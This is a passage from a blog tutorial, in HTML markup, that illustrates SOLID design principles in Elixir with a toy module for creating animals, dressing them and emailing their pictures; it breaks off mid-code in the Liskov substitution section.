&lt;span class="n"&gt;iex&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="ss"&gt;:ok&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;animal_customized&lt;/span&gt; &lt;span class="o"&gt;|&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_picture&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;|&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send_picture_email&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"email@example.com"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;if you noticed that this is not maintainable or scalable, you are right, in the first moment that could work, but responsibilities are mixed in a single module and are confusing.&lt;/p&gt;

&lt;p&gt;The first principle that we are going to use is Single Responsibility, modules must be separated by their context.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#single-responsibility-principle"&gt;
  &lt;/a&gt;
  Single Responsibility Principle
&lt;/h3&gt;

&lt;p&gt;"There should never be more than one reason for a &lt;a href="https://en.wikipedia.org/wiki/Class_(computer_programming)"&gt;class&lt;/a&gt; to change."&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight elixir"&gt;&lt;code&gt;&lt;span class="k"&gt;defmodule&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;create_mammal&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="c1"&gt;#create an animal of type mammal&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;create_carnivorous&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="c1"&gt;#create an animal of type carnivorous&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;

&lt;span class="k"&gt;defmodule&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Clothes&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;add_hat&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;animal&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="c1"&gt;#add a hat to the animal&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;add_shirt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;animal&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="c1"&gt;#add a hat to the animal&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;

&lt;span class="k"&gt;defmodule&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Pictures&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;get_picture&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;animal&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="c1"&gt;#get picture from the animal&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;send_picture_email&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;picture&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;email&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="c1"&gt;#send the picture to email&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;send_picture_whatsapp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;picture&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;number&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="c1"&gt;#send the picture to whatsapp&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;

&lt;span class="n"&gt;iex&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="ss"&gt;:ok&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;animal&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;create_mammal&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;iex&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="ss"&gt;:ok&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;animal_customized&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;animal&lt;/span&gt; &lt;span class="o"&gt;|&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Clothes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add_hat&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;|&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Clothes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add_shirt&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;iex&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="ss"&gt;:ok&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;animal_customized&lt;/span&gt; &lt;span class="o"&gt;|&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Pictures&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_picture&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;|&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Pictures&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send_picture_email&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"email@example.com"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Now is more clear what each module does, but if we get the Animals.Pictures and try to add one more sending method, it starts to be a little repetitive and we break Open Closed principle, because we are modifying an entity.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#open-closed-principle"&gt;
  &lt;/a&gt;
  Open Closed Principle
&lt;/h3&gt;

&lt;p&gt;"Software entities ... should be open for extension, but closed for modification."&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight elixir"&gt;&lt;code&gt;&lt;span class="c1"&gt;# FROM&lt;/span&gt;
&lt;span class="k"&gt;defmodule&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Pictures&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;get_picture&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;animal&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="c1"&gt;#get picture from the animal&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;send_picture_email&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;picture&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;email&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="c1"&gt;#send the picture to email&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;send_picture_whatsapp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;picture&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;number&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="c1"&gt;#send the picture to whatsapp&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;

&lt;span class="c1"&gt;#TO&lt;/span&gt;
&lt;span class="k"&gt;defmodule&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Pictures&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;animal&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="c1"&gt;#get picture from the animal&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;picture&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="ss"&gt;:email&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="c1"&gt;#send the picture to email&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;picture&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="ss"&gt;:whats&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="c1"&gt;#send the picture to whatsapp&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;

&lt;span class="n"&gt;iex&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="ss"&gt;:ok&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;animal&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;create_mammal&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;iex&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="ss"&gt;:ok&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;animal_customized&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;animal&lt;/span&gt; &lt;span class="o"&gt;|&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Clothes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add_hat&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;|&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Clothes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add_shirt&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;iex&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="ss"&gt;:ok&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;animal_customized&lt;/span&gt; &lt;span class="o"&gt;|&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Pictures&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;|&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Pictures&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"email@example.com"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="ss"&gt;:email&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;In that way, we just create a new function send/3 without modifying the entity.&lt;/p&gt;

&lt;p&gt;Another thing that can be improved is the module that creates the animals, currently, it has a general proposal, which is not extensible because we are changing the interface at each modification, sometimes is better to have a specific module that uses the same interface.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#interface-segregation-principle"&gt;
  &lt;/a&gt;
  Interface segregation principle
&lt;/h3&gt;

&lt;p&gt;"Many client-specific interfaces are better than one general-purpose interface."&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight elixir"&gt;&lt;code&gt;&lt;span class="c1"&gt;# FROM&lt;/span&gt;
&lt;span class="k"&gt;defmodule&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;create_mammal&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="c1"&gt;#create an animal of type mammal&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;create_carnivorous&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="c1"&gt;#create an animal of type carnivorous&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;

&lt;span class="c1"&gt;#TO&lt;/span&gt;
&lt;span class="k"&gt;defmodule&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Mammal&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;create&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="c1"&gt;#create an animal of type mammal&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;

&lt;span class="k"&gt;defmodule&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Carnivorous&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;create&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="c1"&gt;#create an animal of type carnivorous&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;

&lt;span class="n"&gt;iex&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="ss"&gt;:ok&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;animal&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Mammal&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;create&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;iex&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="ss"&gt;:ok&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;animal_customized&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;animal&lt;/span&gt; &lt;span class="o"&gt;|&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Clothes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add_hat&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;|&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Clothes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add_shirt&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;iex&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="ss"&gt;:ok&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;animal_customized&lt;/span&gt; &lt;span class="o"&gt;|&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Pictures&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;|&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Pictures&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"email@example.com"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="ss"&gt;:email&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Now they are using the same interface and it is easy to extend each specific module without changing the interface that creates a new animal.&lt;/p&gt;

&lt;p&gt;The Liskov principle states that a superclass object should be replaceable with a subclass object without breaking the functionality of the software and makes heavy use of inheritance and polymorphism, but for a functional programming language we have to deal with it in another way, elixir has behaviours, so all the modules that use the defined behaviour must implement their functions.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#liskov-substitution-principle"&gt;
  &lt;/a&gt;
  Liskov substitution principle
&lt;/h3&gt;

&lt;p&gt;"Functions that use pointers or references to base classes must be able to use objects of derived classes without knowing it."&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight elixir"&gt;&lt;code&gt;&lt;span class="c1"&gt;# FROM&lt;/span&gt;
&lt;span class="k"&gt;defmodule&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Clothes&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;add_hat&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;animal&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="c1"&gt;#add a hat to the animal&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;add_shirt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;animal&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="c1"&gt;#add a shit to the animal&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;

&lt;span class="c1"&gt;#TO&lt;/span&gt;
&lt;span class="k"&gt;defmodule&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Animal&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
  &lt;span class="nv"&gt;@type&lt;/span&gt; &lt;span class="n"&gt;t&lt;/span&gt; &lt;span class="p"&gt;::&lt;/span&gt; &lt;span class="p"&gt;%{&lt;/span&gt;&lt;span class="ss"&gt;type:&lt;/span&gt; &lt;span class="no"&gt;String&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="ss"&gt;name:&lt;/span&gt; &lt;span class="no"&gt;String&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;

  &lt;span class="k"&gt;defstruct&lt;/span&gt; &lt;span class="sx"&gt;~w(type name)a&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;

&lt;span class="k"&gt;defmodule&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Clothes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Clothing&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
  &lt;span class="nv"&gt;@callback&lt;/span&gt; &lt;span class="n"&gt;add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Animal&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;::&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Animal&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;

&lt;span class="k"&gt;defmodule&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Clothes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Hat&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
  &lt;span class="nv"&gt;@behaviour&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Clothes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Clothing&lt;/span&gt;

  &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;animal&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="c1"&gt;#add a hat to the animal&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;

&lt;span class="k"&gt;defmodule&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Clothes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Shirt&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
  &lt;span class="nv"&gt;@behaviour&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Clothes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Clothing&lt;/span&gt;

  &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="n"&gt;add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;animal&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="c1"&gt;#add a shirt to the animal&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;

&lt;span class="k"&gt;defmodule&lt;/span&gt; &lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Clothes&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
  &lt;span class="nv"&gt;@spec&lt;/span&gt; &lt;span class="n"&gt;apply&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;Animals&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="no"&gt;Animal&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;String&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
